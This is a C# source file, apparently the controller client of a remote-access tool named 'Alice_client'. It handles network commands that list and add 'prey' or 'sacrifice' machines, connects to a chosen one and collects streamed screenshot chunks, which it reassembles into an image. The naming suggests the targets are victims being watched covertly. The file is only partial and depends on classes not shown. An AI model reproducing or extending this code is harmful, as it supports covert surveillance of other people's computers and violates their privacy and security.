using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Threading.Tasks;
using System.Drawing;
using System.Threading;

namespace Alice_client
{
    static class Command
    {
        public static IPEndPoint RemoteClient { get; set; }
        public static string response;
        public static bool start_PrtSc { get; set; }
        public static void _CheakCommand(byte[] _resp,IPEndPoint  _aliceSRV)
        {
            string response = BaseTool.Convertbtst(_resp);
            Console.WriteLine(response);
            string[] commands = BaseTool._GetArrSplit(_resp);
            switch (commands[0])
            {
                case "get_all_sacrifice":
                    get_all_sacrifice(commands);
                    break;
                case "append_prey":
                    get_add_sacrifice(commands);
                    break;
                case "for_prey_connect":
                    _startPRTSc(commands);
                    break;
                case "ping":
                    for_ping(commands, _aliceSRV);
                    break;
                case "start_PrtSc":
                    start_PrtSc=true;
                    break;
                case "":
                    
                    Viewer._status = false;
                    Alice_client._status = false;
                    break;
                case "image_byte":
                    start_PrtSc = true;
                    for_image_byte(_resp,_aliceSRV);
                    break;
               

                default:

                    break;

            }

        }

        public static void for_image_byte(byte[] resp, IPEndPoint _aliceSRV)
        {
            byte[] real_image = new byte[resp.Length - 13];
            Array.Copy(resp, 13, real_image, 0, real_image.Length);
           

            Viewer.allbyte.Add(real_image);
            Connection.server1.Send_mess(BaseTool.Convertbtst("OK"), _aliceSRV);

        }
        public static void for_ping(string[] commands,IPEndPoint _aliceSRV)
        {
           
            Connection.server1.Send_mess("[OK][" + User._My._Login + "][connect]", _aliceSRV);
           
        }
        public static void get_all_sacrifice(string[] commands)
        {

            string[] anyrec = BaseTool._DelFirstElement(commands);
            List<Prey> _sacrifice = Prey._ConvertByteArr(anyrec);
            User._My._all_sacrifice = _sacrifice;
            Alice_client._UpdateListPrey();
        }

        public static void _ConnectPrey(int index)
        {
            ConnectPrey.Connect(User._My, Connection.server1, index);
        }

       public static void _startPRTSc(string[] commands)
        {
        

            IPEndPoint _aliceSRV = new IPEndPoint(
                IPAddress.Parse( BaseTool._get_ip_or_port(commands[2], BaseTool.IPorPORT.IP)),
                Convert.ToInt32( BaseTool._get_ip_or_port(commands[2], BaseTool.IPorPORT.PORT)));
            Connection.server1.Send_mess("[OK][" + User._My._Login + "][connect]", _aliceSRV);
            Connection.server1.Send_mess(BaseTool.Convertbtst("OK"), _aliceSRV);

            while (!start_PrtSc)
            {
                Thread.Sleep(1000);
                
            }
         
            Viewer.allbyte = new List<byte[]>();
            for (int i = 0; i < 100; i++)
            {
                byte[] on = Connection.server1.Whait_recive();
                if (on[0].Equals((byte)i))
                {
                    Viewer.allbyte.Add(on);
                    Connection.server1.Send_mess(BaseTool.Convertbtst("OK"), _aliceSRV);
                }
                else
                {

                }
            }

            Bitmap _see = BaseTool._Pullimage(BaseTool._GetList(Viewer.allbyte));
            //see(_see);
            var t = Task.Run(() =>
            {
               // _update_data();
            });
        }


        public static void get_add_sacrifice(string[] commands)
        {
            response = commands[1];
            
        }
        

        
    }
}
